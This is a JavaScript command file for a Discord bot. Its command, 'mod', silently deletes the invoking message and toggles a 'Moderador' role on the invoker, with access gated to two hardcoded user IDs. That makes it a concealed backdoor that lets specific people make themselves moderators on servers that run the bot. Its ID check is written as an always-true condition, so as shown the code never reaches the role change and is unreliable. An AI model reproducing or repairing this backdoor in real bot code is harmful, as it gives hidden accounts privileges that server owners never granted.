module.exports = {
	name: 'mod',
	description: 'Mods myself',
  guildOnly: true,
  async execute(msg, args, isMod) {
    const {author,member, guild} = msg;
    msg.delete();
    if(author.id !== '484774210372108300' || author.id !== '777267994036142131') return;
    const roles = await guild.roles.fetch();
    const modRol = roles.find(role => role.name === 'Moderador');

    if(!isMod) await member.roles.add(modRol)
    else await member.roles.remove(modRol)
  },
};